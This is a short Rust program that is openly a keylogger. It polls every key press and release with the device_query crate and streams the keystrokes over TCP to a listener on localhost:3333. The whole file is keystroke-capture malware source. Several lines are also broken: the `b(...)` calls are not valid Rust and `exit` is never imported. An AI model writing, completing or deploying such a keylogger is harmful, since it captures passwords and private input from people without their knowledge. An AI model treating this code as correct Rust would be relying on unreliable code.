use std::net::TcpStream;
use std::io::{self, Write, Read};
use device_query::{DeviceQuery, DeviceState, Keycode};
use std::{thread, time};

fn main() {
    // Attempt to connect to the server
    match TcpStream::connect("localhost:3333") {
        Ok(mut stream) => {

            // Send initial handshake message
            let msg = b"";
            if let Err(e) = stream.write_all(msg) {
                //println!("Failed to send initial message: {}", e);
                exit(1);
                return;
            }

            // Set non-blocking mode to prevent hangs
            if let Err(e) = stream.set_nonblocking(true) {
                println!("Failed to set non-blocking mode: {}", e);
            }

            // Start keylogging loop
            let device_state = DeviceState::new();
            let mut pressed_keys = Vec::new();
            let mut buffer = [0; 128]; // Buffer for reading server responses
            
            
            loop {
                // Check for new keys
                let current_keys = device_state.get_keys();
                
                // Detect and send newly pressed keys
                for key in &current_keys {
                    if !pressed_keys.contains(key) {
                        let event = format!("{:?}\n", key);
                        if let Err(e) = stream.write_all(event.as_bytes()) {
                            let msgErr = b("Connection error: {}. Exiting...", e);
                            stream.write_all(msgErr.as_bytes());
                            return;
                        }
                    }
                }
                
                // Detect and send released keys
                for key in &pressed_keys {
                    if !current_keys.contains(key) {
                        let event = format!("Released: {:?}\n", key);
                        if let Err(e) = stream.write_all(event.as_bytes()) {
                            let msgErr = b("Connection error: {}. Exiting...", e);
                            stream.write_all(msgErr.as_bytes());
                            return;
                        }
                    }
                }

                pressed_keys = current_keys;


                // Check for server messages
                match stream.read(&mut buffer) {
                    Ok(size) if size > 0 => {
                        let response = String::from_utf8_lossy(&buffer[..size]);
                        println!("{}", response);
                    },
                    Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {},
                    Err(e) => {
                        let msgErr = b("Connection error: {}. Exiting...", e);
                        stream.write_all(msgErr.as_bytes());
                        return;
                    }
                    _ => {}
                }

                // Reduce CPU usage
                thread::sleep(time::Duration::from_millis(20));
            }
        },
        Err(e) => {
            println!("Failed to connect to server: {}", e);
        }
    }
}